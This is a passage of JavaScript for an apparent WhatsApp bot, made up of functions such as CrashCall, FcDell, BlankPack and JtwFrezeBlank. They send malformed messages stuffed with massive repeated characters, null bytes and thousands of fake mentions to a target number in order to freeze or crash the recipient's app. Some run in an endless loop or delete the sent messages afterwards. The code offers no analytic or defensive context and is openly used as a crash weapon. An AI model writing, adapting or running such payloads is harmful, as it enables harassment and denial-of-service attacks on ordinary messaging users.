    ButtonFreeze.push({
      name: "cta_call",
      buttonParamsJson: JSON.stringify({
        status: true,
      })
    });
  }

  const messageContextInfo = {
    deviceListMetadata: {},
    deviceListMetadataVersion: 2,
  };

  const callMessage = {
    viewOnceMessage: {
      message: {
        callInviteMessage: {
          callId: Date.now().toString(36),
          callType: "VIDEO",
          callCreatorJid: target,
          scheduledTimes: Date.now() + 1814400,
          action: "SCHEDULED_CALL_CREATE",
          title: "ꦽYЦИΛΛ :: 404.ΣXΣꦾ",
          subtitle: "ោ៝".repeat(20000) + "ꦾ".repeat(6000),
          callNotificationType: "SCHEDULED_CALL",
        },
      },
    },
  };

  const interactiveMessage = {
    header: {
      title: "ꦽYЦИΛΛ :: 404.ΣXΣꦾ",
      locationMessage: {
        degreesLatitude: 0,
        degreesLongtitude: 0,
      },
      hasMediaAttachMent: true,
    },
    body: {
      text: "ោ៝".repeat(20000) + "ꦾ".repeat(60000),
    },
    nativeFlowMessage: {
      messageParamsJson: "\u0000",
      buttons: ButtonFreeze,
    },
  };

  const forwardMessage = {
    contextInfo: {
      participant: target,
      mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`),
      forwadingScore: 100,
      isForwaded: true,
    },
  };

  const businessMessage = {
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  const quotedMessage = {
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1844000,
      },
    },
  };

  await Abim.relayMessage(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: messageContextInfo,
        interactiveMessage: interactiveMessage,
      },
    },
  }, {});
  await Abim.relayMessage(target, callMessage, { participant: { jid: target } });

  await Abim.relayMessage(target, {
    viewOnceMessage: {
      message: {
        contextInfo: forwardMessage.contextInfo,
        businessMessageForwardInfo: businessMessage.businessMessageForwardInfo,
        quotedMessage: quotedMessage.quotedMessage,
      },
    },
  }, {});
  
  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "ꦽYЦИΛΛ :: 404.ΣXΣꦾ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerMsg, {});

  await Abim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function BlankPack(target) {
console.log(chalk.red(`🧪 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁 ${target}`));
    await Abim.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "𝗪𝗢𝗟𝗞𝗘𝗥 𝙃𝙚𝙧𝙚 𝘽𝙧𝙤!" + "ꦽ".repeat(95000),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 }
async function apollox(number, tagEwe = false) {
  let biji = await generateWAMessageFromContent(
    number,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "You Idiot's",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(9000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  let message = generateWAMessageFromContent(
    number,
    {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `1313555000${z + 1}@s.whatsapp.net`
            ),
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  }, {});

  let etc = generateWAMessageFromContent(
    number,
    {
      interactiveResponseMessage: {
        body: {
          text: "xrl - null",
          format: "EXTENTION_1",
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, z) => `1313555020${z + 1}@s.whatsapp.net`
          ),
          statusAttributionType: "SHARED_FROM_MENTION",
        },
        nativeFlowResponseMessage: {
          name: "menu_options",
          paramsJson:
            '{"display_text":"xrl","id":".fucker","description":"Finnaly my?..."}',
          version: "3",
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  const genos = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
      fileLength: "327833",
      seconds: 15,
      mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
      caption: "Xrelly Mp5" + "\u0000".repeat(9000),
      height: 1248,
      width: 704,
      fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
      directPath:
        "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&nc_sid=5e03e0",
      mediaKeyTimestamp: "1748347294",
      contextInfo: {
        isSampled: true,
        mentionedJid: Array.from(
          { length: 2000 },
          (_, z) => `1313555020${z + 1}@s.whatsapp.net`
        ),
        statusAttributionType: "SHARED_FROM_MENTION",
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Xrelly Mp5",
      },
      streamingSidecar:
        "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
      thumbnailDirectPath:
        "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
      thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
      thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
      annotations: [
        {
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "589608164114571",
              songId: "870166291800508",
              author: "ARE YOU KIDDING ME?!!!",
              title: "\u0000".repeat(90000),
              artworkDirectPath:
                "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
              artistAttribution: "https://www.instagram.com/_u/xrelly",
              countryBlocklist: true,
              isExplicit: true,
              artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
            },
          },
          embeddedAction: true,
        },
      ],
    },
  };

  for (let i = 0; i < 100; i++) {
  await Abim.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await Abim.relayMessage("status@broadcast", biji.message, {
    messageId: biji.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await Abim.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await Abim.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (tagEwe) {
    let nichollx = generateWAMessageFromContent(
      number,
      proto.Message.fromObject({
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: letakx.key,
              type: "STATUS_MENTION_MESSAGE",
              timestamp: Date.now() + 720,
            },
          },
        },
      }),
      {}
    );

    await Abim.relayMessage(number, nichollx.message, {
      participant: { jid: number },
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        },
      ],
    });
  }
}
  
    await new Promise(resolve => setTimeout(resolve, 5000));
}
async function JtwFrezeBlank(target, mention) {
    const bulletPerBatch = 50;
    const repeatSize = 20000;
    const freezePayloadChar = 8000;
    const blankPayloadChar = 5000;
    let batchNumber = 1;

    while (true) { // loop terus-menerus sampai stop manual
        // Generate sections
        const BulletPenetration = Array.from({ length: bulletPerBatch }, (_, r) => ({
            title: "᬴".repeat(repeatSize),
            rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
        }));

        // Payload freeze tambahan
        const freezePayload = Array.from({ length: 20 }, () => "ꙮ".repeat(freezePayloadChar)).join("\n");

        // Payload blank tambahan
        const blankPayload = Array.from({ length: 10 }, () => "⠀".repeat(blankPayloadChar)).join("\n");

        const MSG = {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: `༑⌁⃰⃟PERMISSION X4 ${batchNumber}`,
                        listType: 2,
                        buttonText: "SELECT",
                        sections: BulletPenetration,
                        singleSelectReply: { selectedRowId: "1" },
                        contextInfo: {
                            mentionedJid: [target],
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "10000@newsletter",
                                serverMessageId: batchNumber,
                                newsletterName: freezePayload + "\n" + blankPayload
                            }
                        },
                        description: blankPayload
                    }
                }
            },
            contextInfo: {
                channelMessage: true,
                statusAttributionType: 2
            }
        };

        try {
            const msg = await generateWAMessageFromContent(target, MSG, {});

            await Abim.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target]
            });

            // Tag target satu-satunya
            if (mention) {
                await Abim.relayMessage(
                    target,
                    {
                        statusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25
                                }
                            }
                        }
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: `DONE SEND BUG TO ${batchNumber}` }
                            }
                        ]
                    }
                );
            }

            console.log(`Batch ${batchNumber} sent successfully.`);
        } catch (err) {
            console.error(`Batch ${batchNumber} error:`, err);
        }

        batchNumber++;
        // Optional: delay kecil tiap batch supaya script lebih stabil
        await new Promise(res => setTimeout(res, 1000)); // delay 1 detik
    }
}
async function Delay(target) {
    const Msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "D = ABIM⟅༑", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const Msg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "T = TAMPAN ᝄ", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await Abim.relayMessage("status@broadcast", Msg1.message, {
        messageId: Msg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await Abim.relayMessage("status@broadcast", Msg2.message, {
        messageId: Msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}
async function PayloadLocaDelay(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "( ඩා ) PELERR",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "KILL YOUUU",
                address: "Sasukee☯",
              },
            },
            body: {
              text: "( ඩා ) ABIM IS HERE BRO?",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(30000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await Abim.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function Blankxcore(target) {
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ PELER }"
    }
  };

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: "( ඩා ) ABIM IS HERE BRO?"
          },
          footer: {
            text: "( ඩා ) ABIM"
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: jid,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{{}}",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await Abim.relayMessage(target, message, { messageId: null });
}
async function CrashCall(target) {
  console.log(chalk.red(`Sending Bug To ${target}` ));
let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "͟ABIM CHAMBACK",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[{{]]".repeat(200000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(200000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(200000),
          }, 
        },
      },
    },
  };
  
  const [msg, msg2] = await Promise.all([
    await Abim.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await Abim.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await Abim.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg } }),
    await Abim.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg2 } })
  ]);
}
async function FcDell(target) {
  console.log(chalk.red(`Sending Bug To ${target}`));

  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🧬⃟༑—!𝐄𝐑𝐋𝐀𝐍𝐆𝐆𝐀 𝐈𝐒 𝐇𝐄𝐑𝐄🎭".repeat(9000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            messageParamsJson: "{[{{".repeat(5000) + "".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(10000) + "".repeat(5000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true }) + "".repeat(5000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true }) + "".repeat(50000),
              },
              {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ cameraAccess: true }) + "".repeat(5000),
              },
              ...Array.from({ length: 10 }, () => ({
                name: "single_select",
                buttonParamsJson: "{[{{".repeat(1000) + "".repeat(20000),
              }))
            ],
            messageParamsJson: "{[{{".repeat(5000) + "".repeat(10000), // Repeated
          },
        },
      },
    },
  };

  const [langgxyzMsg1, langgxyzMsg2] = await Promise.all([
    Abim.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    Abim.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    Abim.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: langgxyzMsg1 } }),
    langgxyz.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: langgxyzMsg2 } })
  ]);
}
async function FanzBlank4(target) {
  await Abim.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "1327272@newsletter",
      newsletterName: "I'am FanzKings" + "ោ៝".repeat(10000),
      caption: "ꦾ".repeat(5000),
      inviteExpiration: Date.now() + 1814400,
    },
  }, {});
  
  await Abim.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ោ៝".repeat(10000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachMent: true
          },
          body: {
            text: "I'am AbimKings" + "ꦾ".repeat(5000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{}",
          },
          contextInfo: {
            forwadingScore: 100,
            isForwaded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net",
            },
          },
        },
      },
    },
  }, { participant: { jid: target }, });
}
async function Carlyxyraa(target, Ptcp = true) {
    await Abim.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Abim.id.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(98000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}
async function yuhubim(target) {
  const flood = 2000;

  const venomModsData = "venomModsData";

  const MSG = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ᏑABIM IS HERE BRO?"
          },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: venomModsData + "".repeat(9999)
              },
              {
                name: "payment_method",
                buttonParamsJson: venomModsData + "".repeat(9999)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: venomModsData + "".repeat(9999),
                voice_call: "call_galaxy"
              },
              {
                name: "form_message",
                buttonParamsJson: JSON.stringify({
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  caption: "Wafzz Here",
                  fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                  fileLength: "19769",
                  height: 354,
                  width: 783,
                  mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                  fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                  directPath:
                    "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                  mediaKeyTimestamp: "1743225419",
                  jpegThumbnail: null,
                  scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                  scanLengths: [2437, 17332]
                })
              }
            ]
          },
          footer: {
            text: "I'am AbimKings" + "ꦾ".repeat(9000),
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

